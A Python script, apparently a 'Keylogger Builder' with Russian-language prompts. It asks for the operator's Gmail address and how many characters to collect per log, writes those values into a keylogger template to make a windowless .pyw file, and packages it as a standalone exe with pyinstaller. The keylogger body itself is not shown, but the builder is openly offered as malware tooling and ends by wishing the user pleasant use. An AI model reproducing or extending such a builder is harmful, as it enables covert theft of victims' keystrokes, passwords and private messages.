import os
import codecs
import subprocess
print('''
  _  __          _                              
 | |/ /___ _   _| | ___   __ _  __ _  ___ _ __  
 | ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__| 
 | . \  __/ |_| | | (_) | (_| | (_| |  __/ |    
 |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|    
           |___/         |___/ |___/            
  ____        _ _     _            
 | __ ) _   _(_) | __| | ___ _ __  
 |  _ \| | | | | |/ _` |/ _ \ '__| 
 | |_) | |_| | | | (_| |  __/ |    
 |____/ \__,_|_|_|\__,_|\___|_|    by Exedna...
                                
   ''')


path1 = 'doc.txt'
path2 = 'enter_logger.pyw'
t = ''
print('[+]  Билдер запущен!')
email = input('Введите ваш gmail ящик: ')
if email == '':
    exit('[-]  Введите почту!')
kol_vo = input('Раз в сколько символов вам будут приходить логи? ')
if kol_vo == '':
    exit('[-]  Введите данные!')
print('[+]  Данные получены!')
t = 'TO = "'+ email + '"\nkol_vo = '+ kol_vo + '\n'

c = codecs.open(path1, 'r', 'utf-8')
f = c.readlines()
for l in f:
    t = t + l
c.close()
c = codecs.open(path2, 'w', 'utf-8')
c.write(t)

print('[+]  Python файл создан!')
print('[?]  Запускается компиляция python файла в исполняемый!')
out = subprocess.getoutput('pyinstaller --onefile enter_logger.pyw')
print('[+]  Exe файл создан! Он находиться в папке dist')

print('[+]  Приятного использования!')


